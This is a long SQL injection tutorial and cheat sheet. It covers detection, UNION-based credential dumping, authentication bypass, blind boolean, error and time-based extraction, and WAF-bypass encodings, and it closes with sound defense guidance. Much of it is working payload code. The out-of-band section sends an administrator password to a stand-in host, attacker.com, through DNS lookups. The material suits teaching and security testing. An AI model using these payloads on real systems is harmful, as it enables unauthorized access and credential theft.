# SQL Injection


## Table of Contents

1. [What is SQL Injection?](#1-what-is-sql-injection)
2. [How SQL Queries Work (Foundation)](#2-how-sql-queries-work-foundation)
3. [Where SQL Injection Can Occur](#3-where-sql-injection-can-occur)
4. [Detection — Finding the Entry Point](#4-detection--finding-the-entry-point)
5. [Attack Techniques](#5-attack-techniques)
   - 5.1 [Retrieving Hidden Data](#51-retrieving-hidden-data)
   - 5.2 [Subverting Application Logic (Auth Bypass)](#52-subverting-application-logic-auth-bypass)
   - 5.3 [UNION Attacks — Extracting Data from Other Tables](#53-union-attacks--extracting-data-from-other-tables)
   - 5.4 [Examining the Database (Fingerprinting & Enumeration)](#54-examining-the-database-fingerprinting--enumeration)
   - 5.5 [Second-Order SQL Injection](#55-second-order-sql-injection)
   - 5.6 [SQL Injection in Non-Standard Contexts (JSON/XML)](#56-sql-injection-in-non-standard-contexts-jsonxml)
6. [Blind SQL Injection](#6-blind-sql-injection)
   - 6.1 [Conditional Responses (Boolean-Based)](#61-conditional-responses-boolean-based)
   - 6.2 [Conditional Errors (Error-Based Blind)](#62-conditional-errors-error-based-blind)
   - 6.3 [Verbose Error Messages (Visible Error-Based)](#63-verbose-error-messages-visible-error-based)
   - 6.4 [Time-Based Blind](#64-time-based-blind)
   - 6.5 [Out-of-Band (OAST)](#65-out-of-band-oast)
7. [Impact Assessment](#7-impact-assessment)
8. [Defense & Prevention](#8-defense--prevention)
9. [Quick Reference Cheat Sheet](#9-quick-reference-cheat-sheet)

---

## 1. What is SQL Injection?

SQL injection (SQLi) is a vulnerability that allows an attacker to **interfere with the SQL queries an application sends to its database** by injecting malicious SQL syntax through user-controllable input.

### Simple Analogy

Imagine a restaurant where you place orders by writing them on a slip of paper. The kitchen executes whatever is on the slip without question. If you write *"Give me the pasta, and also hand me the manager's private folder"*, the kitchen complies — because it trusts the slip entirely. SQL injection is the same: the database blindly executes whatever arrives as a query, including attacker-crafted additions.

### Key Insight

- The application builds SQL queries by **concatenating user input directly into query strings**.
- The database has no way to distinguish between the developer's intended SQL and the attacker's injected SQL — it just executes the full string.
- This makes SQLi one of the most impactful and widespread vulnerability classes, capable of full database compromise from a single injectable parameter.

### What Can Be Achieved

- Read data the application didn't intend to expose (other users' data, credentials, PII)
- Modify or delete database content
- Bypass authentication entirely
- Execute OS-level commands in some configurations
- Establish a persistent backdoor into the system
- Enable denial-of-service by corrupting or locking data

---

## 2. How SQL Queries Work (Foundation)

### Normal Application Flow

```
User Input (e.g. category=Gifts)
        │
        ▼
Application builds query string:
"SELECT * FROM products WHERE category = 'Gifts' AND released = 1"
        │
        ▼
Database executes query
        │
        ▼
Results returned to application → rendered to user
```

### The Vulnerable Pattern

Most SQLi occurs because applications build queries through **string concatenation**:

```java
// VULNERABLE — input is pasted directly into the query string
String query = "SELECT * FROM products WHERE category = '" + input + "'";
```

If `input` is `Gifts`, the query is harmless. If `input` is `Gifts'--`, the query becomes:

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

The `--` begins a SQL comment. Everything after it is ignored by the database. The `AND released = 1` restriction disappears.

### Why Concatenation Is Dangerous

The database receives a complete SQL string. It cannot tell which parts were written by the developer and which were injected by the user — there is no boundary marker. The query is just text.

---

## 3. Where SQL Injection Can Occur

SQLi is not limited to `WHERE` clauses. It can arise anywhere user input touches a query:

| Query Location | Example |
|----------------|---------|
| `WHERE` clause (most common) | `SELECT * FROM products WHERE category = '[input]'` |
| `UPDATE` — updated values | `UPDATE users SET email = '[input]' WHERE id = 1` |
| `UPDATE` — `WHERE` clause | `UPDATE users SET x=1 WHERE username = '[input]'` |
| `INSERT` — inserted values | `INSERT INTO feedback (comment) VALUES ('[input]')` |
| `SELECT` — table or column name | `SELECT [input] FROM products` |
| `ORDER BY` clause | `SELECT * FROM products ORDER BY [input]` |

Also injectable through non-query-string vectors:

- **Cookies** — tracking IDs, session tokens used in DB lookups
- **HTTP headers** — `User-Agent`, `Referer`, `X-Forwarded-For` logged to database
- **JSON/XML request bodies** — stock check APIs, search endpoints
- **Path parameters** — `/products/[input]/details`

---

## 4. Detection — Finding the Entry Point

### Primary Probes (Try These First)

Submit each into every input parameter and observe for errors, behavioral changes, or anomalies:

```
'                         → single quote: breaks string context, triggers syntax error
''                        → two quotes: closes and reopens string, often resolves error
`                         → backtick: breaks identifier context in MySQL
')                        → breaks function/parenthesis context
-- -                      → comment sequence: removes rest of query
```

### Boolean-Based Detection

Inject conditions that evaluate to true and false, and compare responses:

```sql
' AND '1'='1              → true condition, should behave normally
' AND '1'='2              → false condition, should behave differently
' OR 1=1--                → always-true, may return extra rows
' OR 1=2--                → always-false, may return no rows
```

A difference in response between the true and false case confirms injectable behavior.

### Time-Based Detection (Blind — No Response Difference)

When responses look identical regardless of input, inject a deliberate delay:

```sql
' AND SLEEP(5)--                          MySQL
'; WAITFOR DELAY '0:0:5'--               MSSQL
' AND pg_sleep(5)--                      PostgreSQL
' AND 1=1 AND SLEEP(5)--                 safe variant
```

If the response is delayed by the specified amount, the input is being processed by the database.

### Error-Based Detection

A single quote often produces a raw database error that confirms injection and reveals the database type:

```
You have an error in your SQL syntax... (MySQL)
Unterminated string literal...          (PostgreSQL)
ORA-01756: quoted string not properly terminated  (Oracle)
Unclosed quotation mark...              (MSSQL)
```

### Out-of-Band Detection

For contexts where none of the above produces a detectable change, trigger a DNS/HTTP callback to an externally controlled server:

```sql
-- MSSQL
'; exec master..xp_dirtree '//attacker.com/a'--

-- Oracle
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?>
  <!DOCTYPE r [<!ENTITY % x SYSTEM "http://attacker.com/">%x;]>'),'/l') FROM dual--
```

A callback to the controlled server confirms the payload executed.

---

## 5. Attack Techniques

### 5.1 Retrieving Hidden Data

**Scenario:** An application uses a `WHERE` clause to filter data, and one of the conditions restricts what the user should see (e.g. `released = 1` hides unreleased items).

**Original query:**
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

**Comment injection — removes the restriction:**
```
/products?category=Gifts'--
```
```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
-- The AND released = 1 is now commented out. All products returned.
```

**OR injection — returns everything:**
```
/products?category=Gifts'+OR+1=1--
```
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
-- 1=1 is always true. Every row in the table is returned.
```

> **Warning:** `OR 1=1` is dangerous if the query feeds into an `UPDATE` or `DELETE` statement elsewhere in the application. It can cause mass data modification or deletion. Use specific conditions in real engagements.

---

### 5.2 Subverting Application Logic (Auth Bypass)

**Scenario:** A login form constructs a query using username and password. If any row is returned, authentication succeeds.

**Original query:**
```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

**Injecting into the username field:**
```
username: administrator'--
password: (anything or blank)
```

**Resulting query:**
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
-- Password check is commented out. Query returns the administrator row → login succeeds.
```

**Why it works:** The `--` comment sequence causes the database to ignore everything after it. The `AND password = ''` check never runs. As long as a user with the injected username exists, login is granted unconditionally.

**Variant — bypass when username is unknown:**
```
username: ' OR 1=1--
password: anything
```
```sql
SELECT * FROM users WHERE username = '' OR 1=1--' AND password = ''
-- Returns all users. First row in the table (often admin) is used for login.
```

---

### 5.3 UNION Attacks — Extracting Data from Other Tables

**What UNION does:** Appends the results of a second `SELECT` query to the first. The injected query runs under the same database connection and permissions as the original.

```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

**Two hard requirements for UNION to work:**
1. Both queries must return the **same number of columns**
2. The data types of corresponding columns must be **compatible**

---

#### Step 1: Determine the Number of Columns

**Method A — ORDER BY increment (cleanest):**
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--    ← if this errors, the query returns 2 columns
```
When the index exceeds the real column count, the database throws an error. The last working number is the column count.

**Method B — NULL padding:**
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
Add one `NULL` at a time until the error disappears and the response contains an extra row. `NULL` is used because it is compatible with every data type.

> **Oracle note:** Every `SELECT` on Oracle requires a `FROM`. Use `FROM dual`:
> ```sql
> ' UNION SELECT NULL FROM dual--
> ```

> **MySQL note:** `--` requires a trailing space (`-- `), or use `#` instead.

---

#### Step 2: Find Columns That Hold String Data

Once column count is known, probe each position to find which accept string values:

```sql
-- For a 3-column query, test each position:
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

If a column doesn't accept strings, the database returns a type conversion error. If it does, the string `'a'` appears in the response.

---

#### Step 3: Extract Target Data

With column count and usable string columns identified, retrieve data:

```sql
-- Two usable string columns:
' UNION SELECT username, password FROM users--

-- One usable string column (concatenate with separator):
' UNION SELECT NULL, username||'~'||password FROM users--   -- Oracle/PostgreSQL
' UNION SELECT NULL, CONCAT(username,'~',password) FROM users--  -- MySQL/MSSQL
```

Results appear inline in the application's normal response, e.g.:

```
administrator~s3cure
wiener~peter
carlos~montoya
```

---

### 5.4 Examining the Database (Fingerprinting & Enumeration)

Before exploiting, identifying the database type and structure is critical. Techniques differ per platform.

#### Fingerprint the Database Type

Inject version queries — whichever one doesn't error identifies the platform:

```sql
' UNION SELECT @@version,NULL--          -- MySQL / MSSQL
' UNION SELECT version(),NULL--          -- PostgreSQL
' UNION SELECT banner,NULL FROM v$version--  -- Oracle
```

Successful output example (MSSQL):
```
Microsoft SQL Server 2016 (SP2) - 13.0.5026.0 (X64)
```

#### List All Tables (Non-Oracle)

```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

#### List All Tables (Oracle)

```sql
' UNION SELECT table_name,NULL FROM all_tables--
```

#### List Columns in a Specific Table (Non-Oracle)

```sql
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

#### List Columns in a Specific Table (Oracle)

```sql
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
```

#### Full Enumeration Flow

```
1. Get column count        → ORDER BY / UNION NULL method
2. Find string columns     → replace NULLs with 'a' one at a time
3. Fingerprint DB version  → try @@version / version() / v$version
4. List tables             → information_schema.tables / all_tables
5. List columns in target  → information_schema.columns / all_tab_columns
6. Dump credentials        → UNION SELECT username, password FROM [target_table]
```

---

### 5.5 Second-Order SQL Injection

**Also known as:** Stored SQL injection.

**How it differs from first-order:**

| | First-Order | Second-Order |
|---|---|---|
| **When injected** | At the HTTP request where it's exploited | At a different, earlier HTTP request |
| **When stored** | Not stored — immediate | Stored safely in DB first |
| **When executed** | Same request | Later request that retrieves and uses the stored value |

**Why it's harder to find:**

The application may correctly use parameterized queries when *inserting* the data, preventing immediate injection. The developer treats the stored value as trusted because "it came from our own database." A *different* code path later retrieves and concatenates that value into a new query unsafely.

**Flow:**

```
Request 1: Register username as: admin'--
           → safely inserted into DB (no injection yet)

Request 2: Application retrieves stored username, builds:
           "SELECT * FROM users WHERE username = 'admin'--'"
           → injection fires at retrieval time
```

**Key insight:** The injection payload survives storage and executes at a completely different part of the application. Standard input filtering at registration time will not prevent this.

---

### 5.6 SQL Injection in Non-Standard Contexts (JSON/XML)

**Scenario:** The application accepts input in a JSON or XML body, processes it server-side, and passes it to a SQL query.

**Plain payload (blocked by WAF):**
```xml
<storeId>1 UNION SELECT NULL</storeId>
```

**WAF bypass via XML entity encoding:**
```xml
<storeId>&#x55;NION &#x53;ELECT NULL</storeId>
<!-- &#x55; = U, &#x53; = S — XML decodes these before they reach the SQL interpreter -->
```

**Full exploitation example (single-column response, concatenated exfil):**
```xml
<storeId>1 UNION SELECT username || '~' || password FROM users</storeId>
```

**Why encoding bypasses WAFs:** WAFs pattern-match for `UNION`, `SELECT`, etc. in raw input. XML entities are decoded server-side *after* the WAF inspection. The SQL interpreter sees the fully decoded string; the WAF sees only harmless character references.

**Other encoding approaches for WAF bypass:**

```
HTML entity:     &#83;ELECT  (S = &#83;)
Hex entity:      &#x53;ELECT
Unicode escape:  \u0053ELECT (in JSON contexts)
Case variation:  SeLeCt, uNiOn
Comment insertion: UN/**/ION SEL/**/ECT
```

---

## 6. Blind SQL Injection

Blind SQL injection occurs when the application is vulnerable but **does not return query results or database errors** in the response. Data must be extracted indirectly by observing differences in application behavior.

### The Four Blind Channels

| Channel | How You Observe the Condition | Speed |
|---------|-------------------------------|-------|
| Conditional response | Different content in page (text appears/disappears) | Fast |
| Conditional error | HTTP 500 vs 200 | Fast |
| Verbose error | Data leaked in error message | Fast (limited) |
| Time delay | Response latency | Slow |
| Out-of-band | DNS/HTTP callback to external server | Fast, most reliable |

---

### 6.1 Conditional Responses (Boolean-Based)

**Precondition:** The application returns visibly different responses depending on whether the injected condition is true or false (e.g. a "Welcome back" message that appears only when the query returns a row).

**Baseline test:**
```sql
' AND '1'='1    → condition true  → "Welcome back" appears
' AND '1'='2    → condition false → "Welcome back" absent
```

**Confirm target table exists:**
```sql
' AND (SELECT 'a' FROM users LIMIT 1)='a
-- If "Welcome back" appears → the users table exists
```

**Confirm target username exists:**
```sql
' AND (SELECT 'a' FROM users WHERE username='administrator')='a
-- If "Welcome back" appears → the user exists
```

**Determine password length:**
```sql
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>10)='a
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>19)='a
-- Binary search until condition flips from true to false → exact length found
```

**Extract password character by character:**
```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='b
...
-- Repeat for positions 2, 3, ... until full password recovered
```

**Binary search optimization (halves the requests needed):**
```sql
-- Is first character > 'm'?
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator') > 'm
-- If true: test 't', if false: test 'g', and so on
```

---

### 6.2 Conditional Errors (Error-Based Blind)

**Precondition:** The application's response doesn't change based on query results, but *does* change when a database error occurs (e.g. HTTP 500 instead of 200).

**Core technique:** Construct a payload that causes a divide-by-zero **only if** the tested condition is true.

```sql
-- Generic pattern using CASE:
' AND (SELECT CASE WHEN ([condition]) THEN 1/0 ELSE 'a' END)='a

-- Condition true  → evaluates to 1/0 → database error → HTTP 500
-- Condition false → evaluates to 'a' → no error      → HTTP 200
```

**Database-specific syntax:**

```sql
-- Oracle
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '

-- MSSQL
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END)=1--

-- PostgreSQL
1=(SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END)

-- MySQL
' AND IF(1=1,(SELECT table_name FROM information_schema.tables),'a')='a
```

**Extracting data with conditional errors:**
```sql
-- Oracle — extract first character of administrator's password:
' || (SELECT CASE WHEN SUBSTR(password,1,1)='a'
     THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '

-- Error (HTTP 500) = condition true = character IS 'a'
-- No error (HTTP 200) = condition false = character is NOT 'a'
```

**Confirming a table exists (Oracle):**
```sql
' || (SELECT '' FROM users WHERE ROWNUM = 1) || '
-- If no error → users table exists
-- Note: ROWNUM = 1 prevents multiple rows from breaking the concatenation
```

---

### 6.3 Verbose Error Messages (Visible Error-Based)

**Precondition:** The database is misconfigured to surface detailed error messages, and those messages reflect query content.

**What a verbose error looks like:**
```
Unterminated string literal started at position 52 in SQL
SELECT * FROM tracking WHERE id = '''. Expected char
```

This reveals the full query and the injection context.

**Turning blind into visible — CAST type mismatch:**

Force a data type conversion error that prints the actual data value:

```sql
-- PostgreSQL
' AND CAST((SELECT password FROM users LIMIT 1) AS int)--
-- Error: invalid input syntax for integer: "s3cure"
--        ↑ actual password value leaked in error message

-- MSSQL
' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--
-- Error: Conversion failed when converting the varchar value 's3cure' to data type int.

-- MySQL
' AND EXTRACTVALUE(1, CONCAT(0x5c,(SELECT password FROM users LIMIT 1)))--
-- Error: XPATH syntax error: '\s3cure'
```

**Key technique — clear the TrackingId to gain character space:**

If a character limit truncates the payload and cuts off the comment sequence (`--`), clear the input value entirely:

```
TrackingId=    (empty)    AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

This frees up characters while keeping the injection syntactically valid.

**Flow for visible error exfiltration:**

```
1. Inject ' → confirm verbose error reveals query structure
2. Add -- to fix syntax → confirm error disappears
3. Inject CAST(subquery AS int) → confirm type mismatch error returns data
4. Change subquery to target: username, password, etc.
5. Use LIMIT 1 if "returned more than one row" error appears
```

---

### 6.4 Time-Based Blind

**Precondition:** The application handles all errors gracefully, responses look identical regardless of results. The only observable channel is **response time**.

**Unconditional delay (confirm injectable + identify DB):**

```sql
-- MySQL
' AND SLEEP(10)--

-- PostgreSQL
' || pg_sleep(10)--

-- MSSQL
'; WAITFOR DELAY '0:0:10'--

-- Oracle
' AND 1=1 AND dbms_pipe.receive_message(('a'),10)--
```

A 10-second delay confirms the payload executed.

**Conditional delay (turn into a boolean oracle):**

```sql
-- PostgreSQL
'; SELECT CASE WHEN (condition) THEN pg_sleep(10) ELSE pg_sleep(0) END--

-- MSSQL
'; IF (condition) WAITFOR DELAY '0:0:10'--

-- MySQL
' AND IF(condition, SLEEP(10), 0)--

-- Oracle
' AND CASE WHEN (condition) THEN dbms_pipe.receive_message(('a'),10) ELSE NULL END--
```

**Extracting data by timing:**

```sql
-- PostgreSQL — extract password character by character:
'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a')
  THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--

-- Delay = 10s → character IS 'a'
-- Delay ≈ 0s  → character is NOT 'a'
```

**Process:**

```
1. Determine password length using LENGTH(password)>N with delay
2. Binary search character space for each position
3. Reconstruct full string from confirmed characters
```

> **Reliability note:** Time-based extraction is inherently noisy (network jitter, server load). Use conservative thresholds (10s delay) and single-threaded requests to minimize false results.

---

### 6.5 Out-of-Band (OAST)

**Precondition:** The application processes queries asynchronously OR none of the previous channels produce detectable differences. The database server must be able to make outbound network connections.

**Why OAST is superior:**

- Does not depend on response content, HTTP status, or response time
- Data can be exfiltrated **directly** in the network interaction (DNS subdomain, HTTP path)
- Works even when the application's response is completely static

**Triggering a DNS lookup (confirm execution):**

```sql
-- MSSQL
'; exec master..xp_dirtree '//attacker.com/a'--

-- Oracle (patched versions — requires elevated privileges)
' UNION SELECT UTL_INADDR.get_host_address('attacker.com') FROM dual--

-- Oracle (via XXE)
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?>
  <!DOCTYPE r [<!ENTITY % x SYSTEM "http://attacker.com/">%x;]>'),'/l') FROM dual--

-- PostgreSQL
'; COPY (SELECT '') TO PROGRAM 'nslookup attacker.com'--

-- MySQL (Windows only)
' UNION SELECT LOAD_FILE('\\\\attacker.com\\a')--
```

**Exfiltrating data via DNS subdomain:**

The stolen data becomes part of the DNS lookup domain — readable from DNS logs or a controlled authoritative nameserver.

```sql
-- MSSQL — password in DNS subdomain:
'; declare @p varchar(1024);
  set @p=(SELECT password FROM users WHERE username='Administrator');
  exec('master..xp_dirtree "//'+@p+'.attacker.com/a"')--
-- DNS query received: s3cure.attacker.com → password = s3cure

-- Oracle — via XXE:
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?>
  <!DOCTYPE r [<!ENTITY % x SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.attacker.com/">%x;]>'),'/l') FROM dual--

-- PostgreSQL:
'; CREATE OR REPLACE FUNCTION f() RETURNS void AS $$
  DECLARE c text; DECLARE p text;
  BEGIN
    SELECT INTO p (SELECT password FROM users WHERE username='administrator');
    c := 'COPY (SELECT '''') TO PROGRAM ''nslookup '||p||'.attacker.com''';
    EXECUTE c;
  END;
  $$ LANGUAGE plpgsql SECURITY DEFINER; SELECT f();--
```

> **Why DNS specifically:** Most production networks permit outbound DNS queries because they are required for normal operation. HTTP egress may be firewall-blocked; DNS typically is not.

---

## 7. Impact Assessment

| Factor | Low Impact | High Impact |
|--------|-----------|-------------|
| **Data returned** | Unreleased/hidden rows | Credentials, PII, financial data |
| **Exploitation type** | Read-only | Read + write + delete |
| **Authentication** | Required | Bypassed entirely |
| **Blind vs visible** | Blind (slow, noisy) | Visible results (immediate) |
| **DB privileges** | Low-privilege user | DBA / SA (system admin) |
| **OS interaction** | None | Command execution via xp_cmdshell / UDF |
| **Persistence** | Single-session | Backdoor user, scheduled task, webshell |

### What a Full Compromise Can Look Like

```
1. Identify injectable parameter
2. Determine DB type and version
3. Enumerate tables → find users table
4. Dump credentials
5. Crack or directly use credentials to log in as admin
6. If DBA privileges: execute OS commands, read files, write webshell
7. Establish persistence
```

---

## 8. Defense & Prevention

### 1. Parameterized Queries (Prepared Statements) — Primary Defense

The root cause of SQL injection is building queries through string concatenation. Parameterized queries **structurally separate** SQL code from data — the database receives them as distinct objects and will never interpret the data portion as SQL.

**Vulnerable (string concatenation):**
```java
String query = "SELECT * FROM products WHERE category = '" + input + "'";
Statement stmt = connection.createStatement();
stmt.executeQuery(query);
```

**Safe (parameterized):**
```java
PreparedStatement stmt = connection.prepareStatement(
    "SELECT * FROM products WHERE category = ?"
);
stmt.setString(1, input);
stmt.executeQuery();
```

Even if `input` is `'; DROP TABLE products--`, the database treats the entire string as a literal value, not SQL. The injection has no effect.

> **Critical rule:** The query string passed to `prepareStatement` must be a **hard-coded constant**. Never concatenate any variable — even supposedly trusted internal data — into the query template itself. The parameterization only protects the `?` placeholders.

### 2. Parameterization Limitations — Whitelist for Dynamic Structure

Parameterized queries cannot handle table names, column names, or `ORDER BY` values — because these are SQL identifiers, not data values. For these, use a strict whitelist:

```python
# Safe handling of user-controlled ORDER BY column
ALLOWED_COLUMNS = {'name', 'price', 'rating', 'release_date'}
sort_by = request.args.get('sort')

if sort_by not in ALLOWED_COLUMNS:
    sort_by = 'name'  # default safe value

query = f"SELECT * FROM products ORDER BY {sort_by}"
```

Never map raw user input to SQL identifiers. Always validate against an explicit set of permitted values.

### 3. Stored Procedures (Used Correctly)

Stored procedures can be safe if they internally use parameterized queries. They are **not** safe if they build SQL strings through concatenation internally.

```sql
-- Safe stored procedure (PostgreSQL):
CREATE PROCEDURE get_user(IN p_username TEXT)
AS $$
  SELECT * FROM users WHERE username = p_username;  -- parameter binding, not concatenation
$$ LANGUAGE SQL;
```

### 4. Allowlist Input Validation

For parameters with a known valid format, validate strictly before any DB interaction:

```python
import re

def validate_category(value):
    if not re.match(r'^[a-zA-Z0-9_-]{1,50}$', value):
        raise ValueError("Invalid category")
    return value
```

This is a **second layer of defense**, not a replacement for parameterized queries. Validation alone can be bypassed; parameterization cannot.

### 5. Least Privilege on Database Accounts

The application's database account should have only the permissions it needs:

```sql
-- Create restricted app user (PostgreSQL):
CREATE USER app_user WITH PASSWORD 'secret';
GRANT SELECT, INSERT, UPDATE ON products TO app_user;
-- No DROP, no TRUNCATE, no access to other tables
```

If an attacker achieves SQLi through this account, they can only interact with permitted tables. They cannot drop tables, read system tables, or execute OS commands.

### 6. Disable Dangerous Database Features

```sql
-- MSSQL: disable xp_cmdshell (OS command execution)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;
```

Disable any feature that an attacker could leverage after gaining SQL execution (file read/write, OS interaction, linked server access).

### 7. Suppress Verbose Error Messages

Never return raw database error messages to users. They reveal query structure, table names, data types, and sometimes actual data values.

```python
# Python/Flask example
try:
    result = db.execute(query, params)
except Exception:
    logging.exception("Database error")      # log full error internally
    return "An error occurred", 500          # return nothing to user
```

### 8. Web Application Firewall (WAF) — Defense in Depth

WAFs can detect and block common SQLi patterns. They are a supplementary layer, not a primary defense — WAF bypass techniques (encoding, comments, case variation) are well-documented. Never rely on a WAF as the sole protection.

---

## 9. Quick Reference Cheat Sheet

### Signs an Endpoint May Be Vulnerable

- Returns different content when a single quote `'` is appended to a parameter
- Shows a database error message on malformed input
- Reflects input values back in SQL-context outputs
- Responds differently to `AND 1=1` vs `AND 1=2`
- Has a noticeable delay when a sleep payload is injected
- Accepts `category`, `id`, `username`, `search`, `order`, `sort`, `page`, `file` parameters

### Payload Progression (Try in Order)

```
1. '                                        detect — does it break?
2. ''                                       detect — does double quote fix it?
3. ' OR 1=1--                              retrieve all rows
4. ' ORDER BY 1--  ORDER BY 2-- ...        determine column count
5. ' UNION SELECT NULL--  (add NULLs)      confirm column count via UNION
6. ' UNION SELECT 'a',NULL--  (swap)       find string-compatible columns
7. ' UNION SELECT @@version,NULL--         fingerprint DB
8. ' UNION SELECT table_name,NULL FROM information_schema.tables--   list tables
9. ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--  list columns
10. ' UNION SELECT username,password FROM users--   dump credentials
11. ' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a   blind extraction
12. ' AND SLEEP(10)--  /  ' || pg_sleep(10)--       time-based confirm
```

### Comment Syntax by Database

| Database | Comment Sequences |
|----------|------------------|
| MySQL | `-- ` (space required), `#`, `/**/` |
| MSSQL | `--`, `/**/` |
| PostgreSQL | `--`, `/**/` |
| Oracle | `--` |

### String Concatenation by Database

| Database | Syntax |
|----------|--------|
| Oracle | `'foo'||'bar'` |
| MSSQL | `'foo'+'bar'` |
| PostgreSQL | `'foo'||'bar'` |
| MySQL | `'foo' 'bar'` or `CONCAT('foo','bar')` |

### Version Queries by Database

| Database | Query |
|----------|-------|
| MySQL / MSSQL | `SELECT @@version` |
| PostgreSQL | `SELECT version()` |
| Oracle | `SELECT banner FROM v$version` |

### Table / Column Enumeration by Database

| Database | List Tables | List Columns |
|----------|------------|--------------|
| MySQL / MSSQL / PostgreSQL | `SELECT table_name FROM information_schema.tables` | `SELECT column_name FROM information_schema.columns WHERE table_name='x'` |
| Oracle | `SELECT table_name FROM all_tables` | `SELECT column_name FROM all_tab_columns WHERE table_name='X'` |

### Conditional Error Syntax by Database

| Database | Syntax |
|----------|--------|
| Oracle | `SELECT CASE WHEN (cond) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
| MSSQL | `SELECT CASE WHEN (cond) THEN 1/0 ELSE NULL END` |
| PostgreSQL | `1=(SELECT CASE WHEN (cond) THEN 1/(SELECT 0) ELSE NULL END)` |
| MySQL | `SELECT IF(cond,(SELECT table_name FROM information_schema.tables),'a')` |

### Time Delay Syntax by Database

| Database | Unconditional | Conditional |
|----------|--------------|-------------|
| MySQL | `SLEEP(10)` | `IF(cond,SLEEP(10),0)` |
| MSSQL | `WAITFOR DELAY '0:0:10'` | `IF (cond) WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `SELECT pg_sleep(10)` | `SELECT CASE WHEN (cond) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
| Oracle | `dbms_pipe.receive_message(('a'),10)` | `CASE WHEN (cond) THEN 'a'\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |

### Blind Extraction Logic (Boolean / Time)

```
Phase 1 — Confirm target exists:
  AND (SELECT 'a' FROM users WHERE username='administrator')='a

Phase 2 — Determine value length:
  AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>N)='a
  Binary search N until condition flips

Phase 3 — Extract character by character:
  AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),POS,1)='CHAR'
  Increment POS from 1 to length, test each CHAR

Phase 4 — Assemble full value from confirmed characters
```

### WAF Bypass Techniques

| Technique | Example |
|-----------|---------|
| Case variation | `UnIoN SeLeCt` |
| Inline comments | `UN/**/ION SEL/**/ECT` |
| URL encoding | `%55NION` (U = %55) |
| Double URL encoding | `%2555NION` |
| XML entity encoding | `&#x55;NION &#x53;ELECT` |
| Whitespace substitution | Tab, newline, form-feed instead of space |
| Scientific notation | `1e0 UNION` |

---
